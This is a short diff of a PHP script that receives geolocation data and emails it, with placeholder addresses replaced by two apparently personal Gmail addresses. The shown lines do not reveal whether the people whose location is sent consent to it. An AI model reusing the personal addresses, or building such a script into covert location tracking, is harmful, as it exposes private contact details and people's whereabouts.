@@ -10,7 +10,7 @@ if ($data !== null) {
     $geolocationData = $data->geolocation;
 
     // Replace with your email address
-    $to = "your-email@example.com";
+    $to = "aslamrehan884@gmail.com";
 
     // Subject for the email
     $subject = "Geolocation Data";
@@ -19,7 +19,7 @@ if ($data !== null) {
     $message = "Geolocation data received:\n" . $geolocationData;
 
     // Additional email headers
-    $headers = "From: your-email@example.com"; // Replace with your email address
+    $headers = "From: muhammadrehan323232@gmail.com"; // Replace with your email address
 
     // Send the email
     $success = mail($to, $subject, $message, $headers);
